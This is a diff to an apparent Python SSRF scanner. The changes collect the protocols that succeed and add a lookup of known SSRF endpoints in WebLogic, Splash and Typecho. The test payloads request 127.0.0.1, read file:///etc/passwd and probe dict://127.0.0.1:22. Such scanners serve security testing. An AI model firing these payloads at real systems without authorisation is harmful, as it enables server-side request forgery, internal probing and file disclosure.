@@ -12,7 +12,7 @@ def test_check(target,parameter):
     protocol = []
     lowerstdlimit = check_time_limit(target)
 
-
+    logging.info("Starting simple test.....")
     payload_http_inner = "{url}?{query}=http://127.0.0.1".format(url=target,query=parameter)
     payload_file = "{url}?{query}=file:///etc/passwd".format(url=target,query=parameter)
     payload_dict = "{url}?{query}=dict://127.0.0.1:22".format(url=target,query=parameter)
@@ -20,19 +20,21 @@ def test_check(target,parameter):
 
     if check_time_content(payload_http_inner,lowerstdlimit):
         dump_console(host=target, parameter=parameter, payload=payload_http_inner, protocol='http')
-
+        protocol.append('http')
         #print("time {0}".format(payload_http_inner))
 
     if check_content(payload_file):
         dump_console(host=target, parameter=parameter, payload=payload_file, protocol='file')
-
+        protocol.append('file')
         #print("file {0}".format(payload_file))
 
     if check_fingerprint(payload_dict):
         dump_console(host=target, parameter=parameter, payload=payload_dict, protocol='dict')
-
+        protocol.append('dict')
         #print("ssh {0}".format(payload_dict))
 
+    if protocol:
+        return list(set(protocol))
     else:
         return False
 
@@ -72,4 +74,14 @@ def check_fingerprint(payload):
             return False
     except:
         return False
+
+#Determine whether the vulnerability is known
+def check_kown(target):
+    f = furl(target)
+    ssrf_list = [{'server':'weblogic','path':'/uddiexplorer/SearchPublicRegistries.jsp/uddiexplorer/SearchPublicRegistries.jsp'},{'server':'Splash','path':'/render.html'},{'server':'Typecho','path':'/action/xmlrpc'}]
+    for i in ssrf_list:
+        if f.path == i['path']:
+            logging.info("found the known SSRF vuln in server poc in plugin/{}.py".format(i['server']))
+            sys.exit(0)
+
 
